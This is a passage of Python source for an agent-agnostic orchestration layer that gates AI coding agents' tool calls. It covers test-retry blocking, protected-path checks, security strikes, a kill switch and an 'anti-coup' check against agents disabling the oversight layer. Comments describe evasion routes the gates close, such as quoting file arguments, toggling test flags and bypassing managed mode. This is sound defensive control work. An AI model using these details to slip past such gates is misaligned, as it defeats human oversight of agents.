"""Agent-agnostic orchestration layer — core logic for tool gating, safety, and context.

This module contains the decision logic that applies to ALL agents (Claude Code,
Codex, DeepSeek, generic CLI). Agent-specific adapters (claude_hook.py, etc.)
map their host's event format to these functions.

The orchestrator does NOT know about hook payload formats, event names, or
host-specific response structures. It returns simple decisions that adapters
translate into host-native responses.
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import Any

from .runtime_service import RuntimeService

# Flags whose argument is guaranteed to be a data payload (message body,
# inline script, format string) — the gate has no business checking
# protected-path substrings inside these. Keep the list narrow: each
# entry is a flag whose VALUE is indisputably NOT a filename the command
# acts on. File-accepting flags (-o, -i, -f with cp/mv/etc.) must NOT
# appear here — their argument is exactly what the gate needs to see.
_DATA_FLAGS: tuple[str, ...] = (
    "-m",
    "--message",  # git commit / git tag / git notes
    "-F",
    "--file",  # git commit -F <file>: the flag itself
    # points at a file, but the VALUE is still
    # a path we want to check, so this is a
    # borderline entry kept for format-parity
    # with heredoc-fed -F invocations
    "-c",  # python -c / node -c / bash -c — inline script
    "-e",  # perl/sed -e — inline script
    "--pretty",  # git log --pretty="..."
    "--format",  # git log --format="..."
    "-d",
    "--data",
    "--data-raw",
    "--data-binary",
    "--data-urlencode",
    "-b",
    "--body",
    "--body-file",  # borderline like -F: value is a path, kept for
    # parity with heredoc-fed --body-file callers
    "-t",
    "--title",
    "--description",
    "-X",
    "--request",  # HTTP verb, never a filename
    "-H",
    "--header",  # header values routinely carry prose / tokens
    "-A",
    "--user-agent",
)


def _strip_bash_quoted_regions(cmd: str) -> str:
    """Replace the interior of SPECIFIC quoted regions with blanks so
    data arguments (commit messages, inline scripts, format strings,
    heredoc bodies) don't false-positive match protected-path patterns.

    Quoting alone is NOT sufficient to hide a path from the gate —
    ``cp "core/plugins/aidocs.js" /tmp/`` has the path as a real file
    argument that cp acts on, and stripping its interior would defeat
    the gate. Only strip quoted tokens that immediately follow a known
    data-only flag (-m, --message, -c, -e, --pretty, --format) or that
    are inside a heredoc body.

    This narrow rule catches the prose-in-commit-message false positive
    without letting an attacker evade the gate by quoting a real file
    argument.
    """
    out: list[str] = []
    i = 0
    n = len(cmd)
    while i < n:
        ch = cmd[i]

        # Heredoc: <<WORD / <<-WORD / <<"WORD" → body is always data.
        if ch == "<" and i + 1 < n and cmd[i + 1] == "<":
            j = i + 2
            if j < n and cmd[j] == "-":
                j += 1
            delim_start = j
            if j < n and cmd[j] in ("'", '"'):
                quote = cmd[j]
                j += 1
                while j < n and cmd[j] != quote:
                    j += 1
                delim = cmd[delim_start + 1 : j]
                j += 1
            else:
                while j < n and (cmd[j].isalnum() or cmd[j] in "_-"):
                    j += 1
                delim = cmd[delim_start:j]
            while j < n and cmd[j] != "\n":
                j += 1
            if j < n:
                j += 1
            body_start = j
            end = n
            if delim:
                needle = "\n" + delim + "\n"
                idx = cmd.find(needle, body_start)
                if idx != -1:
                    end = idx + 1
                else:
                    tail = "\n" + delim
                    if cmd.endswith(tail):
                        end = n - len(delim)
            out.append(cmd[i:body_start])
            out.append(" " * (end - body_start))
            i = end
            continue

        # Quote at non-heredoc position: decide strip vs keep based on
        # the preceding token (data-flag context vs plain file argument).
        if ch in ("'", '"'):
            k = i - 1
            while k >= 0 and cmd[k] in " \t":
                k -= 1
            # Accept --flag="..." equals-form too.
            if k >= 0 and cmd[k] == "=":
                k -= 1
            token_end = k + 1
            while k >= 0 and cmd[k] not in " \t\n":
                k -= 1
            preceding = cmd[k + 1 : token_end]
            is_data_position = preceding in _DATA_FLAGS

            if not is_data_position:
                # Real file-argument quote — content must stay visible.
                out.append(ch)
                i += 1
                continue

            # Strip interior of the data-flag's quoted value.
            if ch == "'":
                j = cmd.find("'", i + 1)
                if j == -1:
                    out.append(cmd[i:])
                    break
                out.append("' '")
                i = j + 1
                continue
            j = i + 1
            while j < n:
                c = cmd[j]
                if c == "\\" and j + 1 < n:
                    j += 2
                    continue
                if c == '"':
                    break
                j += 1
            if j >= n:
                out.append(cmd[i:])
                break
            out.append('" "')
            i = j + 1
            continue

        out.append(ch)
        i += 1
    return "".join(out)


# ── Test-retry gate ──────────────────────────────────────────────────
# Agents, when a test fails, fall into "re-run pytest hoping it changes"
# loops. The test-driven-validation skill says: re-running identical
# verification without addressing the failure yields nothing. This gate
# detects repeated test-runner bash invocations against the same targets
# and escalates: nudge → stern warning → block. The messages name the
# fix (diagnose and address the failure), never the reset mechanism —
# agents must learn through action, not by reading the gate's internals.

_TEST_RUNNER_BASES: frozenset[str] = frozenset(
    {
        "pytest",
        "jest",
        "vitest",
        "mocha",
        "karma",
        "nose",
        "nose2",
        "tox",
        "behave",
        "rspec",
        "phpunit",
    },
)

# Subcommand-form runners: base + first arg must match to qualify.
# `npm test` → yes. `npm run build` → no.
_TEST_RUNNER_SUBCOMMANDS: dict[str, frozenset[str]] = {
    "npm": frozenset({"test", "t"}),
    "pnpm": frozenset({"test", "t"}),
    "yarn": frozenset({"test"}),
    "bun": frozenset({"test"}),
    "cargo": frozenset({"test"}),
    "go": frozenset({"test"}),
    "dotnet": frozenset({"test"}),
    "uv": frozenset({"run"}),  # refined below by requiring pytest in the tail
    "mvn": frozenset({"test"}),
    "gradle": frozenset({"test"}),
    "make": frozenset({"test", "check"}),
}

# Edit tools that reset the test-retry counter. Both AIDOCS indexed and
# raw host tools count — if the agent bypasses managed mode the gate
# still resets correctly from the raw tool path.
_TEST_RETRY_EDIT_TOOLS: frozenset[str] = frozenset(
    {
        "ai_str_replace",
        "ai_edit_lines",
        "ai_insert_lines",
        "ai_batch_edit",
        "ai_create_file",
        "ai_slop",
        "Edit",
        "Write",
        "MultiEdit",
        "NotebookEdit",
    },
)

# Pytest-style noise flags stripped from the normalized key so agents
# can't dodge the gate by toggling -v / --tb / etc.
_TEST_NOISE_FLAGS: frozenset[str] = frozenset(
    {
        "-q",
        "--quiet",
        "-v",
        "--verbose",
        "-vv",
        "-vvv",
        "-x",
        "--exitfirst",
        "-s",
        "--no-header",
        "--no-summary",
        "-p",
        "--capture=no",
        "--showlocals",
    },
)


def _segment_is_runner(segment: str) -> bool:
    # Detects a test-runner invocation within a single command segment
    # (no chain ops). Env-var prefixes are stripped so
    # "PYTHONPATH=x pytest ..." still matches.
    import shlex

    try:
        tokens = shlex.split(segment or "", posix=False)
    except ValueError:
        tokens = (segment or "").split()
    while tokens and "=" in tokens[0] and not tokens[0].startswith("-"):
        tokens = tokens[1:]
    if not tokens:
        return False
    base = tokens[0].lower().rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
    base = base.removesuffix(".exe")
    if base in _TEST_RUNNER_BASES:
        return True
    if base in ("python", "python3") and len(tokens) >= 3 and tokens[1] == "-m":
        return tokens[2].lower() in {"pytest", "unittest", "nose2"}
    subcmds = _TEST_RUNNER_SUBCOMMANDS.get(base)
    if subcmds and len(tokens) >= 2 and tokens[1].lower() in subcmds:
        if base == "uv":
            tail = " ".join(tokens[2:]).lower()
            return "pytest" in tail or "unittest" in tail
        return True
    return False


def _find_runner_segment(command: str) -> str | None:
    # Agents habitually chain `cd <dir> && pytest ...` or
    # `source venv/bin/activate && npm test`. The gate must treat such
    # chains as test-runner invocations, otherwise noise commands in
    # front of pytest slip every retry through.
    from .bash_policy import _split_chained

    for segment in _split_chained(command or ""):
        if _segment_is_runner(segment):
            return segment
    return None


def _is_test_runner_invocation(command: str) -> bool:
    """Return True if this bash command contains a test-runner segment."""
    return _find_runner_segment(command) is not None


def _normalize_test_command_key(command: str) -> str:
    # Keys the gate's dedup count. Only the runner segment defines the
    # "same verification"; `cd d:/foo && pytest x` and `cd d:/bar && pytest x`
    # are the same verification from the agent's standpoint. Noise flags
    # are stripped so -v / --tb / -n can't fork the key.
    import shlex

    segment = _find_runner_segment(command) or command
    try:
        tokens = shlex.split(segment or "", posix=False)
    except ValueError:
        tokens = (segment or "").split()
    kept: list[str] = []
    skip_next = False
    for tok in tokens:
        if skip_next:
            skip_next = False
            continue
        if tok in _TEST_NOISE_FLAGS:
            continue
        if tok.startswith("--tb") or tok.startswith("--durations"):
            continue
        if tok == "-n":
            skip_next = True
            continue
        if tok.startswith("-n") and len(tok) > 2:
            continue
        kept.append(tok)
    return " ".join(sorted(kept))


# Canonical denial taxonomy — every block path through check_tool() and
# the claude_hook agent-brief gate tags its ToolDecision with one of
# these tier strings. Regression tests, audit events, and dashboard
# filters assert on this vocabulary, so treat it as a stable contract.
DENIAL_TIERS: frozenset[str] = frozenset(
    {
        "managed_mode_inactive",
        "tier0_edit_redirect",
        "tier0_raw_shell",
        "tool_policy",
        "raw_tool",
        "lane_tool",
        "test_retry",
        "bash_policy",
        # bash_policy refusal that is downgrade-eligible to a confirm-user
        # ask path because operator destructive-intent was detected for
        # this session. Tagged separately so audit/dashboard tooling can
        # distinguish flat blocks from confirmable ones.
        "bash_policy_confirmable",
        "heuristic_judge",
        "infrastructure",
        "foreground_long_running",
        "agent_brief",
        # Audit hardening A (2026-04-19): mutating tool called outside an
        # open task. Every write must be attributable via task_id so the
        # audit chain has meaningful linkage. Read-only tools exempt.
        "no_active_task",
        # Cross-agent conflict gate (Outer Gate App Metadata clause 3): a
        # single-path file edit was refused because a DIFFERENT live agent
        # (any chat) already owns the target file. Sourced from existing
        # session_lane_agents lane scope; inert when no lanes are live.
        "cross_agent_scope_conflict",
    },
)


# MCP tools that mutate state and therefore require an active task_id.
# Read-only discovery/query tools (ai_find, ai_get_lines, memory_read,
# schema_query, etc.) intentionally absent — exploration must not require
# task ceremony. Keep in lockstep with server_code_edit_tools wiring.
MUTATING_MCP_TOOLS: frozenset[str] = frozenset(
    {
        "ai_create_file",
        "ai_edit_lines",
        "ai_insert_lines",
        "ai_str_replace",
        "ai_batch_edit",
        "ai_slop",
        "ai_run",
        "ai_delete",  # governed delete (trash-based), 2026-05-27
        "memory_capture",
        "edit_rollback",
        "edit_rollback_batch",
        "protect_file",
    },
)


@dataclass(slots=True)
class ToolDecision:
    """Result of a tool gate check.

    Semantic outcomes (2026-04-25, backlog #17 Category 5 fix):
      - allowed=True, needs_confirmation=False → ALLOW, run tool
      - allowed=False, needs_confirmation=False → DENY, hard-block
      - allowed=False, needs_confirmation=True → ASK-USER: host
          adapter should surface native confirmation primitive (CC
          permissionDecision=ask, OpenCode permission ask, Codex
          PermissionRequest hook). If adapter cannot surface a
          confirmation, falls back to hard DENY with reason.

    Core emits the semantic outcome; adapter maps to host native
    mechanism. No universal ask-user wire contract — each host has
    its own, and AIDOCS routes through whichever one is available.
    Degrades fail-closed (deny over silent-allow) when host lacks
    the primitive.
    """

    allowed: bool
    reason: str = ""
    advisory: str = ""  # non-blocking nudge text
    # Canonical denial tier when allowed=False. Empty on allow.
    blocked_by: str = ""
    # Semantic ask-user flag. True only when the gate decided the
    # operator should get a chance to approve in-place. Adapters
    # that support native confirmation surface it; others hard-deny.
    needs_confirmation: bool = False
    # Approval-card enrichment (carried to freeze_service so the canonical
    # card shows accurate risk class + jurisdiction). Empty → defaults.
    risk_class: str = ""
    jurisdiction: str = ""


@dataclass(slots=True)
class PromptContext:
    """Context to inject into the agent's prompt."""

    text: str
    action_kind: str = ""
    session_id: str = ""


# Tools that bypass all gate checks regardless of agent
SYSTEM_TOOLS: set[str] = {
    # TodoWrite/TodoRead removed 2026-04-23 — the block is explicit below.
    # AIDOCS task_begin/task_update/task_complete are the canonical
    # lifecycle; TodoWrite is ~479 tokens/use of redundant ephemeral
    # state and CC's periodic reminder inflates agent context further.
    "compact",
    "askuserquestion",
    "enterplanmode",
    "exitplanmode",
    "skill",
    "enterworktree",
    "exitworktree",
    "agent",
}

# Tools that are explicitly disabled on AIDOCS-managed projects.
# Unlike SYSTEM_TOOLS (pass-through bypass), these get refused with
# a short advisory pointing to the AIDOCS replacement. The block is
# explicit so a future edit can't accidentally re-bypass the tool.
DISABLED_TOOLS: dict[str, str] = {
    "todowrite": "Use ai_task(mode='begin') instead — TodoWrite is disabled on AIDOCS projects.",
    "todoread": "Use ai_task(mode='status') — TodoRead is disabled.",
}

# Tools that MUST be callable even when managed mode is not yet active.
# Without these the operator can't bootstrap a session on a fresh
# project: /aidocs -> aidocs_orchestrate refuses, ai_session
# schema load refuses, every path leads back to
# "Run /aidocs first" which itself is refused. Chicken-and-egg.
# These tools are a security-equivalent subset: read-only session
# discovery plus the explicit bind tools. Writing code still requires
# an active managed-mode bind; nothing here mutates project state.
BOOTSTRAP_TOOLS: set[str] = {
    "aidocs_orchestrate",
    "orchestrate",
    "ai_session",
    # session_start: thin compat alias for Claude Code's hardcoded
    # bootstrap probe (capability_definitions_get → session_start
    # on /mcp reconnect). Restored 2026-05-03 as auto-activator —
    # see server_session_tools.py for the rationale.
    "session_start",
    "project_bootstrap_or_resume",
    "project_status",
    "project_check",
    "project_init",
    "admin_clear_reconnect",
    "toolsearch",
}

# ── Tool Tiering ──
# Tier 1 (eager): agent sees these immediately — no ToolSearch needed.
# Everything else: deferred, discoverable via ToolSearch or surfaced by the
# tool_discovery keyword matcher when the prompt topic matches.
#
# Pruning principle: eager = used on almost every session. Once-per-session
# bootstrap tools, niche variants, and diagnostics are DEFERRED to keep the
# always-loaded surface small. Individual tools can still force eager via
# `@server.tool(eager=True)` if profiling shows they need it.
EAGER_TOOLS: set[str] = {
    # Core code intelligence — hit on almost every turn.
    "ai_investigate",
    "ai_find",
    "ai_get_lines",
    "ai_bundle",
    "ai_trace",
    "ai_search",
    "ai_text_search",
    "ai_get_symbol_snippet",
    # Code editing — the writers an agent reaches for first.
    # ai_replace is the unified entry (king doctrine 2026-05-01): one
    # tool, four modes (string/anchor/symbol/lines). Less tools with
    # more uses = happier populace. Eager because it's the canonical
    # edit surface — agents must see it without a ToolSearch round-trip.
    # Deferred: ai_insert_lines (niche variant).
    "ai_replace",
    "ai_edit_lines",
    "ai_str_replace",
    "ai_anchor_replace",
    "ai_create_file",
    "ai_batch_edit",
    # Build/test — invoked for verification on most sessions.
    # Unified detached runner (handles tests + builds + arbitrary shell).
    "ai_run",
    # Session/task hot path — every session begins with these.
    # Public session tools are all eager: agent can list, pick, create,
    # connect without ToolSearch round-trips.
    # Deferred: session_update/resume_bundle/claim/release (multi-agent
    # coordination paths; reached for after bootstrap).
    "session_list",
    "session_create",
    "task_begin",
    "task_update",
    "task_complete",
    # Project bootstrap — only the entry tool is eager.
    # Deferred: project_init, project_status, project_check, runtime_preflight.
    "project_bootstrap_or_resume",
    # Lane worker bootstrap — Step 0 binding + dispatch reporting + raw run.
    # Without these eager, lane workers blow their first turn on ToolSearch
    # round-trips just to discover their own contract.
    # (lane-b-test 2026-04-19: w-4e431f6e9c74 self-aborted citing missing
    # schemas for session_connect / plan_dispatch_report.)
    "session_connect",
    "plan_dispatch_report",
    "ai_run",
    # Memory — capture is the write surface agents must know.
    # Deferred: memory_read, memory_search (surfaced by memory_discovery nudges).
    "memory_capture",
    # Index refresh — asked by users often enough to keep eager.
    # Deferred: index_sync, project_sync_indexes (redundant aliases).
    "ai_index_sync",
    # session_journal_log / session_journal_read DELETED 2026-04-20 —
    # audit trail lives in execution_events sqlite (Merkle-chained),
    # populated automatically by the orchestrator + hooks.
    # Cross-project hot path — conductors reach for these when coordinating
    # handoffs between projects. Low call frequency per-session but high
    # value-per-call; missing them on a hit forces ToolSearch round-trips
    # that break the conductor's flow.
    "project_list",
    "project_list_sessions",
    "handoff_create",
    # Break-glass tools (2026-04-24): these are the recovery paths when
    # something's wrong. Must be eager — if the agent is STUCK (desync,
    # bad lane scope), ToolSearch round-trips might themselves be
    # blocked, trapping the agent. Eager = always visible + callable.
    "admin_clear_reconnect",
    "conductor_lane_exit",
}

# Conductor control + incident-response verbs are eager so a SEATED conductor
# sees its full toolkit immediately. Under fire — a frozen session, a runaway
# or stalled worker — a ToolSearch round-trip is exactly when discovery
# friction is worst (120% clause A). Sourced from the canonical
# conductor_doctrine so the eager set and the role text can never disagree.
from .conductor_doctrine import CONDUCTOR_TOOLSETS as _CONDUCTOR_TOOLSETS  # noqa: E402

EAGER_TOOLS.update(_CONDUCTOR_TOOLSETS["control"])


def is_eager_tool(tool_name: str) -> bool:
    """Check if a tool should be eagerly loaded (visible to agent immediately)."""
    name = tool_name.strip().lower()
    for prefix in ("mcp__aidocs__",):
        name = name.removeprefix(prefix)
    return name in EAGER_TOOLS or name in SYSTEM_TOOLS


class AgentOrchestrator:
    """Agent-agnostic orchestration — tool gating, safety, context building."""

    def __init__(self, runtime: RuntimeService) -> None:
        self.runtime = runtime

    @property
    def hub(self) -> Any:
        return self.runtime.hub

    @staticmethod
    def _normalized_tool(tool_name: str) -> str:
        """Bare lowercase tool name with mcp__aidocs__/mcp__ prefix stripped."""
        n = (tool_name or "").strip().lower()
        for prefix in ("mcp__aidocs__", "mcp__"):
            if n.startswith(prefix):
                return n[len(prefix) :]
        return n

    def _host_session_ids(self, project_root: Path, session_id: str) -> list[str]:
        """Current session ids for session-bound task-artifact recognition:
        the managed session_id PLUS the host (CC) session UUID stamped by the
        hook as last_cli_session_id. The harness writes task/deploy output to
        ``<TEMP>/claude/<slug>/<host-uuid>/tasks/``, so the host UUID is the
        binding that lets THIS session read its own output (and refuses other
        sessions'). De-duplicated, empties dropped."""
        out: list[str] = []
        sid = str(session_id or "").strip()
        if sid:
            out.append(sid)
        try:
            host = str(
                self.hub.query_gate.get_last_cli_session_id(project_root, sid) or "",
            ).strip()
            if host and host not in out:
                out.append(host)
        except Exception:
            pass
        return out

    def _resolve_actor(self, project_root: Path, session_id: str) -> tuple[str, str]:
        """Resolve (actor, lane_id) for a tool-call security strike.

        actor ∈ {agent, subagent, lane_worker} (operator is the prompt
        path). lane_worker when a lane is bound; subagent when the
        principal resolves as a subagent; agent otherwise.
        """
        lane_id = ""
        if session_id:
            try:
                st = self.hub.query_gate.get(project_root, session_id) or {}
                lane_id = str(st.get("current_lane_id") or "").strip()
            except Exception:
                lane_id = ""
        if lane_id:
            return "lane_worker", lane_id
        try:
            from .identity_resolver import current_user

            _uid, _email, principal_type = current_user(project_root)
            if principal_type == "subagent":
                return "subagent", ""
        except Exception:
            pass
        return "agent", ""

    def _security_strike(
        self,
        project_root: Path,
        session_id: str,
        family: str,
        tool_name: str,
        target: str,
    ):
        """Record a repeated-security-violation strike; may create a freeze
        on the threshold-th strike. Returns a ViolationOutcome or None.
        Best-effort: never raises into the gate path.
        """
        try:
            from .security_violation_service import SecurityViolationService

            actor, lane_id = self._resolve_actor(project_root, session_id)
            # Per-agent strike/freeze scope: the CALLING agent's host_session_id
            # so one agent's strikes never freeze co-session siblings. user_id
            # is attribution only.
            try:
                from .mcp_server_runtime_helpers import current_calling_host_session_id

                _host = (current_calling_host_session_id() or "").strip()
            except Exception:
                _host = ""
            try:
                from .identity_resolver import current_user

                _uid = str(current_user(project_root)[0] or "")
            except Exception:
                _uid = ""
            return SecurityViolationService(self.hub).record_and_escalate(
                project_root,
                session_id=session_id,
                family=family,
                actor=actor,
                lane_id=lane_id,
                target=str(target or ""),
                tool_name=tool_name,
                host_session_id=_host,
                user_id=_uid,
            )
        except Exception:
            return None

    @staticmethod
    def _augment_reason(reason: str, outcome) -> str:
        msg = getattr(outcome, "message", "") if outcome else ""
        return f"{reason}\n\n{msg}" if msg else reason

    def check_tool(
        self,
        project_root: Path,
        tool_name: str,
        tool_input: dict[str, object] | None = None,
    ) -> ToolDecision:
        """Check if a tool call should be allowed. Agent-agnostic.

        Returns ToolDecision with allowed=True/False and reason/advisory text.
        Adapters translate this into host-specific responses.
        """
        from .access_gate import (
            AccessGate,
            GateContext,
            PathInputConflict,
            _extract_path,
        )

        tool_input = tool_input or {}

        # Per-call effective_config snapshot. The cascade below reads
        # effective_config from up to several branches (security / dev); each
        # call is ~9 ms (MEASURED) and resolves the whole catalog. Within ONE
        # check_tool the config is a fixed snapshot, so resolve it AT MOST ONCE
        # and reuse — verdict-identical (same dict, every downstream .get incl.
        # the legacy gate/security fallback unchanged) and freshness-preserving
        # (the NEXT check_tool call re-reads). Lazy: branches that never read
        # config pay nothing.
        _eff_memo: dict = {}

        def _effective():
            if "v" not in _eff_memo:
                _eff_memo["v"] = self.runtime.effective_config(project_root)
            return _eff_memo["v"]

        # [BREAK-GLASS] kill_switch FIRST — castle law (2026-05-04):
        # the emergency key must hang outside the prison cell, not
        # inside it. Path-input-conflict, managed-mode, judge, and
        # every other gate that COULD refuse must be downstream of
        # this check. OpenCode and OpenAI Agents backends enter
        # check_tool directly (bypass the CC hook), so this is the
        # only kill_switch they ever see.
        try:
            from .enforcement import (
                is_kill_switch_active as _kill_active_top,
            )
            from .enforcement import (
                record_kill_switch_bypass as _kill_record_top,
            )

            if _kill_active_top(project_root):
                _kill_record_top(
                    project_root,
                    source="agent_orchestrator",
                    target=tool_name,
                )
                return ToolDecision(
                    allowed=True,
                    reason="enforcement_disabled_bypass",
                )
        except Exception:
            # Helper raise must not block the tool — fall through to
            # normal cascade. The transport-safety invariant (lane
            # 1.6) ensures we never propagate gate exceptions.
            pass

        # Path-input conflict refusal (co-conductor 2026-04-30).
        # Multiple path-shaped keys (file_path / filePath / path /
        # notebook_path / notebookPath) resolving to distinct values
        # is ambiguous input — refused at the trust boundary before
        # any gate runs, so different gates cannot decide on different
        # paths within the same call. Single source of truth for
        # downstream extractors.
        try:
            _extract_path(tool_input)
        except PathInputConflict as _path_conflict:
            return ToolDecision(
                allowed=False,
                reason=(f"Tool `{tool_name}` blocked: {_path_conflict}"),
                blocked_by="path_input_conflict",
            )

        # ─── Cross-agent conflict gate (Outer Gate App Metadata clause 3) ──
        # Refuse a single-path file edit that would race a DIFFERENT live
        # agent (any chat) already owning the target file. Sourced from the
        # existing session_lane_agents lane scope — inert when no lanes are
        # live (connected_agents == []), so ordinary solo edits are
        # unaffected. Fail-open on any internal error: a bug here must never
        # wrongly block; the normal cascade below still runs. Placed right
        # after the path-conflict guard so _extract_path is already validated.
        try:
            import os as _os

            from . import cross_agent_coordination as _coord

            _edit_path = _extract_path(tool_input)
            if _edit_path:
                try:
                    from .mcp_server_runtime_helpers import (
                        current_calling_host_session_id as _cchsi,
                    )

                    _caller_host = (_cchsi() or "").strip()
                except Exception:
                    _caller_host = ""
                _xconf = _coord.edit_conflict_for_tool(
                    project_root,
                    tool_name,
                    _edit_path,
                    caller_worker_id=_os.environ.get("AIDOCS_EXPERT_ID", "").strip(),
                    caller_host_session_id=_caller_host,
                )
                if _xconf:
                    return ToolDecision(
                        allowed=False,
                        reason=_xconf["doctrine"],
                        blocked_by="cross_agent_scope_conflict",
                    )
        except Exception:
            # Conflict probe must never break the gate — fall through.
            pass

        # ─── SEC-012 (2026-04-22) decision-trace accumulator ──────────
        # Built at entry, each layer appends a {layer, result, notes}
        # entry via _sec012_trace.add(...), emission at every return
        # path via _sec012_finalize(). Opt-in via config
        # security.emit_decision_trace. Accumulation is free (list
        # append); emission is the expensive part and is gated.
        from .decision_trace import DecisionTrace, is_trace_enabled

        _sec012_trace = DecisionTrace(
            tool_name=tool_name,
            tool_input=dict(tool_input) if isinstance(tool_input, dict) else {},
        )

        # Advise-and-continue accumulator. A gate that wants to NUDGE without
        # short-circuiting the law cascade (e.g. the test-retry gate's 1st/2nd
        # run) appends here and falls through; the text rides on whichever
        # ALLOW decision the cascade ultimately exits through. Block/confirm
        # decisions ignore it — their own reason dominates. This is what makes
        # "advise on retry, but still run the full bash-policy/dangerous-chain/
        # judge cascade" possible without an early-return allow that would skip
        # downstream law.
        _pending_advisories: list[str] = []

        def _sec012_finalize(decision: ToolDecision) -> ToolDecision:
            if decision.allowed and _pending_advisories:
                _parts = [*_pending_advisories]
                if decision.advisory:
                    _parts.append(decision.advisory)
                decision.advisory = " ".join(p for p in _parts if p)
            _sec012_trace.set_final(
                allowed=bool(decision.allowed),
                reason=str(decision.reason or ""),
                blocked_by=str(decision.blocked_by or ""),
            )
            if is_trace_enabled(project_root):
                try:
                    self.hub.execution.record_event(
                        project_root,
                        event_kind="tool_decision_trace",
                        source_kind="sec012_trace",
                        session_id=_sec012_trace.session_id or None,
                        capability_name="check_tool",
                        action_kind="trace",
                        target_entity=tool_name,
                        status="allowed" if decision.allowed else "blocked",
                        payload=_sec012_trace.to_payload(),
                    )
                except Exception:
                    pass
            return decision

        # [DEV-ONLY FAILSAFE] Kill switch short-circuit. Mirrors the
        # claude_hook outer check — if enforcement is disabled on a
        # dev-flavor install, every tool is allowed unconditionally.
        # Belt-and-braces: the hook already returns None on bypass
        # (so check_tool normally wouldn't be reached), but opencode
        # and codex backends route through this path WITHOUT going
        # through the Claude hook, so we check again here.
        try:
            # Redundant: kill_switch already consulted at function
            # top (castle law 2026-05-04). Branch retained as dead
            # code only until the controller migration deletes the
            # whole try/except block; `if False` keeps the body from
            # running while preserving trace shape.
            if False:
                _sec012_trace.add(
                    "kill_switch",
                    "bypass",
                    flavor="dev",
                    reason="dev kill switch active",
                )
                from .enforcement import (
                    record_kill_switch_bypass as _kill_record,
                )

                _kill_record(
                    project_root,
                    source="agent_orchestrator",
                    target=tool_name,
                )
                return _sec012_finalize(
                    ToolDecision(
                        allowed=True,
                        reason="enforcement_disabled_bypass",
                    ),
                )
        except Exception:
            pass
        _sec012_trace.add("kill_switch", "pass")

        # ─── Anti-coup canonical authority (2026-05) ──────────────────
        # Every agent-invoked mutation that can install/remove/disable/
        # bypass/shadow/weaken AIDOCS routes through ONE verdict here —
        # shell commands AND file/config tool surfaces alike. Placed after
        # the break-glass kill switch (the emergency key wins) and the
        # path-input-conflict check (single source of truth for the path),
        # before any other gate. Fails CLOSED on uncertainty.
        try:
            from .anticoup import classify_tool as _anticoup_classify

            _coup = _anticoup_classify(tool_name, dict(tool_input))
        except Exception:
            # T0 invariant: import/availability failure at the chokepoint
            # must NOT silently skip the law. Fail CLOSED by DEFAULT for
            # anything power-changing, using NO mutation list (which could
            # drift / miss unknown ai_* writers): block when the call
            # carries a command, OR carries a path and is not one of a
            # tiny, stable set of universally-safe READ tools. Reads /
            # tools with neither a command nor a path fall through so a
            # broken module cannot brick the whole transport.
            _ti_fc = dict(tool_input)
            _cmd_fc = _ti_fc.get("command")
            _mut_bearing = isinstance(_cmd_fc, str) and bool(_cmd_fc.strip())
            if not _mut_bearing:
                _nt_fc = tool_name.strip().lower()
                for _p_fc in ("mcp__aidocs__", "mcp__"):
                    if _nt_fc.startswith(_p_fc):
                        _nt_fc = _nt_fc[len(_p_fc) :]
                        break
                # Tiny stable safe-read allowlist (no mutation list → no
                # drift; unknown ai_* writers fail closed here).
                _safe_reads_fc = (
                    "read",
                    "grep",
                    "glob",
                    "ls",
                    "notebookread",
                )
                _has_path_fc = any(
                    isinstance(_ti_fc.get(k), str) and _ti_fc.get(k).strip()
                    for k in (
                        "file_path",
                        "filePath",
                        "path",
                        "notebook_path",
                        "notebookPath",
                        "target",
                        "dest",
                        "destination",
                    )
                )
                _mut_bearing = _has_path_fc and _nt_fc not in _safe_reads_fc
            if _mut_bearing:
                _sec012_trace.add("anticoup", "unavailable_fail_closed")
                try:
                    self.hub.execution.record_event(
                        project_root,
                        event_kind="anticoup_verdict",
                        source_kind="agent_orchestrator.check_tool",
                        capability_name=tool_name,
                        action_kind="evaluate",
                        target_entity=str(tool_name)[:200],
                        status="deny",
                        payload={
                            "tool_name": tool_name,
                            "kind": "unavailable",
                            "decision": "deny",
                            "reason": "anti-coup authority unavailable",
                        },
                    )
                except Exception:
                    pass
                return _sec012_finalize(
                    ToolDecision(
                        allowed=False,
                        reason=(
                            "anti-coup authority unavailable; refusing a "
                            "power-changing call (fail closed)"
                        ),
                        blocked_by="anticoup_unavailable",
                    ),
                )
            _coup = None  # non-mutation call → other gates still run.
        if _coup is not None and _coup.decision in ("deny", "confirm"):
            _sec012_trace.add(
                "anticoup",
                "block" if _coup.decision == "deny" else "confirm",
                kind=_coup.kind,
                jurisdiction=_coup.jurisdiction,
            )
            try:
                self.hub.execution.record_event(
                    project_root,
                    event_kind="anticoup_verdict",
                    source_kind="agent_orchestrator.check_tool",
                    capability_name=tool_name,
                    action_kind="evaluate",
                    target_entity=str(tool_name)[:200],
                    status=_coup.decision,
                    payload={
                        "tool_name": tool_name,
                        "kind": _coup.kind,
                        "decision": _coup.decision,
                        "jurisdiction": _coup.jurisdiction,
                        "label": _coup.label,
                        "reason": _coup.reason,
                    },
                )
            except Exception:
                pass
            _jx = (
                "; the registered tool would run OUTSIDE AIDOCS jurisdiction"
                if _coup.jurisdiction == "out"
                else ""
            )
            if _coup.decision == "deny":
                return _sec012_finalize(
                    ToolDecision(
                        allowed=False,
                        reason=(
                            f"anti-coup: {_coup.kind} blocked ({_coup.reason or _coup.label}){_jx}"
                        ),
                        blocked_by=f"anticoup_{_coup.kind}",
                    ),
                )
            return _sec012_finalize(
                ToolDecision(
                    allowed=False,
                    needs_confirmation=True,
                    reason=(
                        f"anti-coup: {_coup.kind} requires operator "
                        f"approval ({_coup.reason or _coup.label}){_jx}"
                    ),
                    blocked_by=f"anticoup_{_coup.kind}",
                    risk_class=f"control_plane:{_coup.kind}",
                    jurisdiction=_coup.jurisdiction,
                ),
            )
        _sec012_trace.add("anticoup", "pass")

        # Explicitly disabled tools (TodoWrite / TodoRead): refuse with
        # a short advisory pointing to the AIDOCS replacement. Fires
        # BEFORE managed-mode check so the block is consistent whether
        # or not a session is bound. CC's periodic "TodoWrite hasn't
        # been used" reminder is host-native and can't be suppressed
        # from here — agents should ignore the nag on this project.
        _norm_disabled = tool_name.strip().lower()
        for _prefix in ("mcp__aidocs__", "mcp__"):
            if _norm_disabled.startswith(_prefix):
                _norm_disabled = _norm_disabled[len(_prefix) :]
                break
        if _norm_disabled in DISABLED_TOOLS:
            _sec012_trace.add(
                "disabled_tools",
                "block",
                matched=_norm_disabled,
            )
